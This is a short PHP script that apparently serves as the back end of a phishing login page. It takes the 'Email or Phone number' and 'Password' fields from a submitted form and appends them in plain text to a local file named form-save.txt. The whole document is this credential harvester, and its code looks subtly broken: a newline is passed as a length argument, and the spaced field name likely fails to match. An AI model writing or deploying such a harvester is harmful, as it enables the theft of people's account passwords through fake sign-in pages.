<?php
$EmailorPhonenumber = $_POST["Email or Phone number"];
$Password =$_POST["Password"];
?>
<?php
$file=fopen("form-save.txt","a");

fwrite($file,"Email or Phone number :");
fwrite($file, $EmailorPhonenumber , "\n");

fwrite($file,"Password :");
fwrite($file, $Password , "\n");
fclose($file);
?>